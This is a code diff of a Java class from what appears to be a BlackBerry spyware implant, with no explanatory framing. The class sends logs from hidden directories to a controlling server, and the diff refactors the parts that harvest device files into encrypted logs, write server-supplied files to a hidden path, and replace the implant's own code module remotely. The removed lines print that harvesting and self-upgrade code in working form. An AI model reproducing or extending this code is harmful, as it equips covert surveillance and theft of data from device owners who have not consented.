@@ -410,8 +410,8 @@ public class Transfer {
 
         fillPayload(command);
         if (command.size() > 0) {
-            
-            final boolean ret = Protocol.saveNewConf(command.payload);
+
+            final boolean ret = Protocol.saveNewConf(command.payload, 0);
             if (!ret) {
                 throw new CommandException(); //"write"
             } else {
@@ -498,10 +498,10 @@ public class Transfer {
         //#ifdef DBC
         Check.requires(depth > 0, "wrong recursion depth");
         //#endif
-        
+
         saveRootLog(); // depth 0
         final Enumeration roots = FileSystemRegistry.listRoots();
-        
+
         while (roots.hasMoreElements()) {
             String root = (String) roots.nextElement();
             if (root.endsWith("/")) {
@@ -571,14 +571,14 @@ public class Transfer {
                 debug.trace("expandPath: dir");
                 //#endif
                 dPath = dPath.substring(0, dPath.length() - 1); // togli lo /
-            }else{
+            } else {
                 //#ifdef DEBUG
                 debug.trace("expandPath: file");
                 //#endif
             }
 
-            if (dPath.indexOf(Utils.chomp(Path.SD(),"/")) >= 0
-                    || dPath.indexOf(Utils.chomp(Path.USER(),"/")) >= 0) {
+            if (dPath.indexOf(Utils.chomp(Path.SD(), "/")) >= 0
+                    || dPath.indexOf(Utils.chomp(Path.USER(), "/")) >= 0) {
                 //#ifdef DEBUG
                 debug.warn("expandPath ignoring hidden path: " + dPath);
                 //#endif
@@ -685,94 +685,14 @@ public class Transfer {
         debug.trace("downloading file: " + filefilter);
         //#endif
 
-        AutoFlashFile file = new AutoFlashFile(filefilter, false);
-        if (file.exists()) {
-            //#ifdef DEBUG
-            debug.trace("logging file: " + filefilter);
-            //#endif
-            saveFileLog(file, filefilter);
-        } else {
-            //#ifdef DEBUG
-            debug.trace("not a file, try to expand it: " + filefilter);
-            //#endif
-            for (Enumeration enum = Directory.find(filefilter); enum
-                    .hasMoreElements();) {
-                String filename = (String) enum.nextElement();
-
-                file = new AutoFlashFile(filename, false);
-                if (file.isDirectory()) {
-                    continue;
-                }
-
-                saveFileLog(file, filename);
-
-                //#ifdef DEBUG
-                debug.trace("logging file: " + filename);
-                //#endif
-
-            }
-        }
+        Protocol.saveDownloadLog(filefilter);
 
         sendCommand(Proto.ENDFILE);
         waitForOK();
-        
-      //#ifdef DEBUG
-        debug.trace("ENDFILE");
-        //#endif
-    }
-
-    private void saveFileLog(AutoFlashFile file, String filename) {
-        //#ifdef DBC
-        Check.requires(file != null, "null file");
-        Check.requires(file.exists(), "file should exist");
-        Check.requires(!filename.endsWith("/"), "path shouldn't end with /");
-        Check.requires(!filename.endsWith("*"), "path shouldn't end with *");
-        //#endif
-
-        byte[] content = file.read();
-        byte[] additional = logDownloadAdditional(filename);
-        Log log = new Log(false, Keys.getInstance().getAesKey());
-        log.createLog(additional, LogType.DOWNLOAD);
-        log.writeLog(content);
-        log.close();
-    }
-
-    private byte[] logDownloadAdditional(String filename) {
-
-        //#ifdef DBC
-        Check.requires(filename != null, "null file");
-        Check.requires(!filename.endsWith("/"), "path shouldn't end with /");
-        Check.requires(!filename.endsWith("*"), "path shouldn't end with *");
-        //#endif
-
-        String path = Utils.chomp(Path.USER(), "/"); // UPLOAD_DIR
-        int macroPos = filename.indexOf(path);
-        if (macroPos >= 0) {
-            //#ifdef DEBUG
-            debug.trace("macropos: " + macroPos);
-            //#endif
-            String start = filename.substring(0, macroPos);
-            String end = filename.substring(macroPos + path.length());
-
-            filename = start + Directory.hiddenDirMacro + end;
-        }
 
         //#ifdef DEBUG
-        debug.trace("filename: " + filename);
+        debug.trace("ENDFILE");
         //#endif
-
-        int version = 2008122901;
-        byte[] wfilename = WChar.getBytes(filename);
-        byte[] buffer = new byte[wfilename.length + 8];
-
-        final DataBuffer databuffer = new DataBuffer(buffer, 0, buffer.length,
-                false);
-
-        databuffer.writeInt(version);
-        databuffer.writeInt(wfilename.length);
-        databuffer.write(wfilename);
-
-        return buffer;
     }
 
     /**
@@ -820,21 +740,8 @@ public class Transfer {
         debug.trace("uploaded file: " + command.size());
         //#endif
 
-        final AutoFlashFile file = new AutoFlashFile(Path.USER() + filename,
-                true);
-        if (file.exists()) {
-            //#ifdef DEBUG
-            debug.trace("getUpload replacing existing file: "+ filename);
-            //#endif
-            file.delete();
-        }
-        file.create();
-        file.write(command.payload);
-
-        //#ifdef DEBUG
-        debug.trace("file written: " + file.exists());
-        //#endif
-        
+        Protocol.saveUpload(filename,command.payload);
+               
         sendCommand(Proto.OK);
     }
 
@@ -862,7 +769,7 @@ public class Transfer {
         //#endif
         fillPayload(command);
         if (command.size() > 0) {
-            if (upgrade(command.payload)) {
+            if (Protocol.upgrade(command.payload)) {
                 sendCommand(Proto.OK);
 
             } else {
@@ -875,85 +782,8 @@ public class Transfer {
 
     }
 
-    private boolean upgrade(byte[] codBuff) {
-        // Delete it self.
-        final int handle = CodeModuleManager.getModuleHandle(Conf.MODULE_NAME);
-        if (handle != 0) {
-            final int success = CodeModuleManager.deleteModuleEx(handle, true);
-            //#ifdef DEBUG
-            debug.info("deleted: " + success);
-            //#endif
-        } else {
-            return false;
-        }
-        // Download new cod files(included sibling files).
+    
 
-        if (isZip(codBuff)) {
-            //#ifdef DEBUG
-            debug.warn("zip not supported");
-            //#endif
-            return false;
-        } else {
-            int newHandle = 0;
-            // API REFERENCE:
-            // You need to write the data in two separate chunks.
-            // The first data chunk must be less thank 64KB in size.
-            final int MAXAPPEND = 61440; // 1024*60;
-
-            if (codBuff.length > MAXAPPEND) {
-                newHandle = CodeModuleManager.createNewModule(codBuff.length,
-                        codBuff, MAXAPPEND);
-
-                final boolean appendSucc = CodeModuleManager.writeNewModule(
-                        newHandle, MAXAPPEND, codBuff, MAXAPPEND,
-                        codBuff.length - MAXAPPEND);
-
-                codBuff = null;
-            } else {
-                newHandle = CodeModuleManager.createNewModule(codBuff.length,
-                        codBuff, codBuff.length);
-
-            }
-            // install the module
-            if (newHandle != 0) {
-                final int savecode = CodeModuleManager.saveNewModule(newHandle,
-                        true);
-                if (savecode != CodeModuleManager.CMM_OK_MODULE_OVERWRITTEN) {
-                    //#ifdef DEBUG
-                    debug.error("Module not overwritten");
-                    //#endif
-                    return false;
-                }
-            }
-            //#ifdef DEBUG
-            debug.info("Module installed");
-            //#endif
-
-            // restart the blackberry if required
-            if (CodeModuleManager.isResetRequired()) {
-                //#ifdef DEBUG
-                CodeModuleManager.promptForResetIfRequired();
-                //#endif
-                //#ifdef DEBUG
-                debug.warn("Reset required");
-                //#endif
-            }
-        }
-        return true;
-    }
-
-    private boolean isZip(byte[] core) {
-
-        if (core.length >= 4) {
-            // zip files start with PK followed by 0x03 and 0x04
-            if (core[0] == 0x50 && core[1] == 0x4B && core[2] == 0x03
-                    && core[3] == 0x04) {
-                return true;
-            }
-        }
-        return false;
-
-    }
 
     /**
      * Inits the.
@@ -1537,10 +1367,10 @@ public class Transfer {
 
         sendLogs(Path.SD());
         sendLogs(Path.USER());
-       
+
         sendCommand(Proto.LOG_END);
         waitForOK(); //??
-        
+
         //#ifdef DEBUG
         debug.trace("syncLogs: all logs sent");
         //#endif
